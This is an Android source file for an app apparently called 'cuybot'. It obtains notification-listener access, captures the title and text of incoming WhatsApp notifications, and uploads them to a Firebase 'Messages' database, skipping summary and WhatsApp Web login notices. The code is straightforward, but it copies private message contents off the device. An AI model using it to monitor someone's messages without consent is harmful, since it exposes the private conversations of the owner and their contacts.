package com.cuybot;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final String BROADCAST_ACTION = "com.cuybot.whatsappnotification";

    private ReceiveBroadcastReceiver imageChangeBroadcastReceiver;
    private DatabaseReference databaseReference;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Initialize Firebase reference
        databaseReference = FirebaseDatabase.getInstance().getReference().child("Messages");

        // Check and request notification listener permission
        if (!isNotificationServiceEnabled()) {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
        }

        // Setup broadcast receiver
        setupBroadcastReceiver();
    }

    private void setupBroadcastReceiver() {
        imageChangeBroadcastReceiver = new ReceiveBroadcastReceiver();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(BROADCAST_ACTION); // Fixed action name
        registerReceiver(imageChangeBroadcastReceiver, intentFilter);
        Log.d(TAG, "BroadcastReceiver registered");
    }

    private boolean isNotificationServiceEnabled() {
        String packageName = getPackageName();
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        boolean enabled = flat != null && flat.contains(packageName);
        Log.d(TAG, "Notification service enabled: " + enabled);
        return enabled;
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (imageChangeBroadcastReceiver != null) {
            try {
                unregisterReceiver(imageChangeBroadcastReceiver);
                Log.d(TAG, "BroadcastReceiver unregistered");
            } catch (IllegalArgumentException e) {
                Log.e(TAG, "Error unregistering receiver: " + e.getMessage());
            }
        }
    }

    public class ReceiveBroadcastReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            try {
                int receivedNotificationCode = intent.getIntExtra("NotificationCode", -1);
                String title = intent.getStringExtra("title");
                String text = intent.getStringExtra("text");
                String notificationCode = String.valueOf(receivedNotificationCode);

                Log.d(TAG, "Received broadcast - Code: " + receivedNotificationCode +
                        ", Title: " + title + ", Text: " + text);

                if (text != null && !text.trim().isEmpty()) {
                    // Filter out unwanted notifications
                    if (!text.contains("new messages") &&
                            !text.contains("WhatsApp Web is currently active") &&
                            !text.contains("WhatsApp web login") &&
                            !text.contains("WhatsApp Web login")) {

                        Log.d(TAG, "Saving to Firebase...");

                        // Save to Firebase
                        Users users = new Users(title, text, notificationCode);
                        databaseReference.push().setValue(users)
                                .addOnSuccessListener(aVoid -> {
                                    Log.d(TAG, "Data saved successfully to Firebase");
                                })
                                .addOnFailureListener(e -> {
                                    Log.e(TAG, "Failed to save data to Firebase: " + e.getMessage());
                                });
                    } else {
                        Log.d(TAG, "Message filtered out: " + text);
                    }
                } else {
                    Log.w(TAG, "Received null or empty text");
                }

            } catch (Exception e) {
                Log.e(TAG, "Error in onReceive: " + e.getMessage(), e);
            }
        }
    }
}